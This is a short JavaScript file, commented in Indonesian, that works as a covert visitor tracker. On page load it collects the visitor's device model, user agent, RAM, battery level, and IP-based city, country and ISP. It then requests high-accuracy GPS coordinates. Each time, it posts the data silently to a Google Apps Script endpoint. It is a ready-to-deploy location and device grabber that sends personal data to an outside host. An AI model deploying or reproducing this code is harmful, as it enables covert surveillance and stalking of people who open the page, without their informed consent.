(async function() {
  // GANTI DENGAN URL WEB APP ANDA YANG BARU
  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzmEb40mGpetgHqgvJsN_NggEa5mb4TTjV4nf5jgLonGJk5CF7rGlchqVwcnIHPJJt0hQ/exec";

  const getDeviceModel = () => {
    const ua = navigator.userAgent;
    if (/android/i.test(ua)) {
      const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
      return match ? match[1] : "Android Device";
    }
    if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) {
      const w = window.screen.width, h = window.screen.height;
      if (w === 390 && h === 844) return "iPhone 12/13/14 Pro";
      if (w === 430 && h === 932) return "iPhone 14/15 Pro Max";
      return "Apple iOS Device";
    }
    return navigator.platform || "PC/Laptop";
  };

  const startTracker = async () => {
    let payload = {
      ip: "-", city: "-", country: "-", isp: "-",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      ram: navigator.deviceMemory || "N/A",
      battery: "0",
      deviceName: getDeviceModel()
    };

    // MENGAMBIL IP, KOTA, NEGARA, DAN ISP (Lebih Stabil)
    try {
      const res = await fetch('http://ip-api.com/json/');
      const d = await res.json();
      if (d.status === "success") {
        payload.ip = d.query;
        payload.city = d.city;
        payload.country = d.country;
        payload.isp = d.isp;
      }
    } catch (e) { console.log("Gagal mengambil data IP-API"); }

    // Ambil Data Baterai
    if (navigator.getBattery) {
      try { 
        const b = await navigator.getBattery();
        payload.battery = Math.round(b.level * 100);
      } catch (e) {}
    }

    const sendData = (data) => {
      fetch(WEB_APP_URL, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify(data)
      });
    };

    // Kirim data awal (IP & Device Info)
    sendData(payload);

    // Minta lokasi GPS
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        payload.lat = pos.coords.latitude;
        payload.long = pos.coords.longitude;
        payload.accuracy = pos.coords.accuracy.toFixed(2) + "m";
        sendData(payload); 
      }, null, { enableHighAccuracy: true });
    }
  };

  window.addEventListener('load', () => {
    startTracker();
  });
})();
